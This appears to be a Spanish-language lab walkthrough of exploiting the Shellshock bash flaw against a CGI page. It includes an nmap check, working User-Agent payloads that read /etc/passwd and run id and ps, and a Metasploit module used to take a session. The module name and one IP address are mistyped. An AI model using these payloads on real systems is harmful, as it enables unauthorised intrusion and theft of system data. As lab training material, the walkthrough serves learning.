Vamos a explotar la vulnerabilidad 2014-6271 relacionada con el protocolo http

Para ello primero escanearemos el puerto con nmap
![[Pasted image 20240312091406.png]]

Accedemos al navegador para ver la pagina web y revisamos el codigo
![[Pasted image 20240312091522.png]]

![[Pasted image 20240312091545.png]]

Para comprobar si es vulnerable utilizaremos el siguiente auxiliar de nmap
nmap --script http-shellshock --script-args “http-shellshock.uri=/gettime.cgi” 192.116.179.3
![[Pasted image 20240312091850.png]]

Como vemos es vulnerable, para ello iniciaremos burpsuite y ejecutaremos la siguiente página
192.1168.179.3/gettime.cgi
![[Pasted image 20240312092714.png]]

Como podemos ver aqui nos muestra lo que ha capurado de la web, si seguimos la vulnerabilidad pasaremos todo el codigo a repeater y añadiremos el siguiente codigo en el user-agent: 
() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'
![[Pasted image 20240312093115.png]]

Como respuesta nos mostrara la inforamción del archivo /etc/passwd
![[Pasted image 20240312093532.png]]


Ahora si ejecutamos el siguiente obtendremos mas información
() { :; }; echo; echo; /bin/bash -c 'id'
![[Pasted image 20240312093704.png]]

Si escribimos el siguiente comando podremos obtener que programas estan ejecutandose, simula que estamos utilizando el comandos ps
() { :; }; echo; echo; /bin/bash -c 'ps -eaf'
![[Pasted image 20240312094155.png]]

Ahora utilizaremos un modulo de metasploit para tomar control del equipo
exploit/multi/http/apache_mod_gi_bash_env>_exec
![[Pasted image 20240312094923.png]]

configuramos el exploit
![[Pasted image 20240312095021.png]]

Y al ejecutarlo podemos ver que obtenemos la sesión
![[Pasted image 20240312095107.png]]


